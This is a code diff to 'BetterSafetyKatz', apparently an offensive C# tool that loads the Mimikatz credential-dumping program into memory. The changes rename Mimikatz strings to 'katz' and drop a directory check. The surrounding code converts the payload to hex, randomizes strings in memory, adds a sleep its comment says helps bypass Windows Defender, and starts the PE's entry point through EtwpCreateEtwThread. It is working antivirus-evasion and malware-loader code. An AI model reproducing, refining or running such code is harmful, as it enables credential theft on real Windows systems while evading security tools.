@@ -35,14 +35,6 @@ namespace BetterSafetyKatz
             }
             else
             {
-                // initial sanity checks
-                string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
-                string dumpDir = String.Format("{0}\\Temp\\", systemRoot);
-                if (!Directory.Exists(dumpDir))
-                {
-                    Console.WriteLine(String.Format("[X] Dump directory \"{0}\" doesn't exist!", dumpDir));
-                    return;
-                }
 
                 if (!(IntPtr.Size == 8))
                 {
@@ -80,11 +72,11 @@ namespace BetterSafetyKatz
                 Console.WriteLine("[+] Randomizing strings in memory");
 
 
-                //Turn mimikatz into hex
+                //Turn katz into hex
                 string hexCats = BitConverter.ToString(catStream.ToArray()).Replace("-", string.Empty);
 
 
-                //These are Function names from external DLL, they are detected, but luckly MimiKatz mainly "works" without them
+                //These are Function names from external DLL, they are detected, but luckly katz mainly "works" without them
                 // 05.10.2020 -  Turns out we don't need to replace these to get past Defender, so it's excluded to avoid some functions breaking
                 /*
                 var strinsToReplaceUTF = new string[] {
@@ -308,12 +300,13 @@ namespace BetterSafetyKatz
                     }
                 }
 
-                Console.WriteLine("[+] Executing loaded Mimikatz PE");
+                Console.WriteLine("[+] Creating thread!");
                 IntPtr threadStart = (IntPtr)((long)(codebase.ToInt64() + (int)pe.OptionalHeader64.AddressOfEntryPoint));
 
                 //This is needed for bypass , ¯\_(ツ)_/¯ Defender is weird
                 Thread.Sleep(2000);
 
+                //Ripped from https://gist.github.com/TheWover/b2b2e427d3a81659942f4e8b9a978dc3
                 IntPtr hThread = WINLib.EtwpCreateEtwThread(threadStart, IntPtr.Zero);
 
                 //Change to create-thread
